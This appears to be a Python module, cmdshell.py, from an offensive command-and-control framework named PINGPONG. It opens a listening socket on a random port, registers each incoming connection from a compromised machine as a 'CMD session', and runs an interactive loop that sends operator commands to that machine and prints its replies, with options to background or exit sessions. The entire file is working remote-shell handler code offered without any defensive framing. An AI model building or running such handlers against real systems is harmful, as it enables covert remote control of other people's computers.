# -*- coding:utf-8 -*-
# @FileName  :cmdshell.py
# @Time      :2022/11/08 18:19:18
# @Author    :D0WE1L1N
import socket
import sys
sys.path.append("..")
import random
try:
    import handler
    import main, config_set
except:
    pass
import PINGPONG_script.addsend as addsend
global is_open
is_open = True
def start(ip, cmd_port, conn, main_port, _main_port=''):
    sessions_pool = main.get_value('connect_pool')
    if sessions_pool == None:
        sessions_pool = []
    if cmd_port == "":
        port = 8625
    if ip == "":
        ip = "127.0.0.1"
    else:
        try:
            port = int(cmd_port)
        except:
            main.print_error("handler>[-]port input error")
    try:
        cmd_session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cmd_session.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cmd_session.bind((ip, cmd_port))
        cmd_session.listen(10)
    except socket.error as msg:
        main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
        sys.exit(1)
    while True:
        cmd_SessObj,addr = cmd_session.accept()
        _ip = addr[0]
        _port = addr[1]
        if not [cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session'] in sessions_pool:
            sessions_pool.append([cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session'])
            id = len(sessions_pool)
            main.print_normal(f"CMD_SHELL>[*]CMD session {id} Created:" + ip + ":" + str(cmd_port) + " >>> " + _ip + ":" + str(_port))
            main.print_normal(f"CMD_SHELL>[*]Use 'exit' to exit the session. Use 'bg' to background the session")
        else:
            id = sessions_pool.index([cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session']) + 1
        if not port == '':
            cmd_shell(cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session, port=_main_port)
        else:
            cmd_shell(cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session)
def cmd_shell(cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session, port=0):
    sessions_pool = main.get_value('connect_pool')
    while True:
        try:
            cmd_command = input("CMD_SHELL>")
            cmd_SessObj.send(bytes(cmd_command, 'utf8'))
            if cmd_command == "exit" or cmd_command == "EXIT":
                main.print_normal("CMD_SHELL>[*]exiting......")
                sessions_pool.remove([cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session'])
                cmd_SessObj.close()
                if cmd_session != None:
                    cmd_session.close()
                if main_port != ' ' and conn != None:
                    conn.recv(1024)
                    handler.PINGPONG_shell(conn, ip, main_port, _ip, port, False, '')
                else:
                    main.main()
                return True
            elif cmd_command == 'bg' or cmd_command == 'BG' or cmd_command == 'background' or cmd_command == 'BACKGROUND':
                main.print_normal("CMD_SHELL>[*]Backgrounding session......")
                main.set_config('connect_pool', sessions_pool)
                if main_port != ' ':
                    conn.recv(1024)
                    handler.PINGPONG_shell(conn, ip, main_port, _ip, port, False, '')
                else:
                    main.main()
            elif not cmd_command:
                continue
            CMD_re = cmd_SessObj.recv(1024)
            try:
                print(str(ip) + ">"+ CMD_re.decode('utf-8'))
            except:
                print(str(ip) + ">" + CMD_re.decode('gbk'))
        except socket.error:
            main.print_error("CMD_SHELL>[-]CMD session Died, reason: Connection refused")
            sessions_pool.remove([cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session'])
            main.set_config('connect_pool', sessions_pool)
            main.print_normal("handler>[*]Back to main console......")
            main.main()
def run(conn, addr, my_addr):
    if addsend.App_send("CMDSHELL_APP", True, conn, addr, my_addr):
        main.print_good("PINGPONG>[+]GOT IT")
        cmd_port = random.randint(5000, 8000)
        conn.send(bytes(str(cmd_port), "utf8"))
        conn.recv(1024)
        start(addr[0], cmd_port, conn, my_addr[1], addr[1])
def init_is_open():
    return True
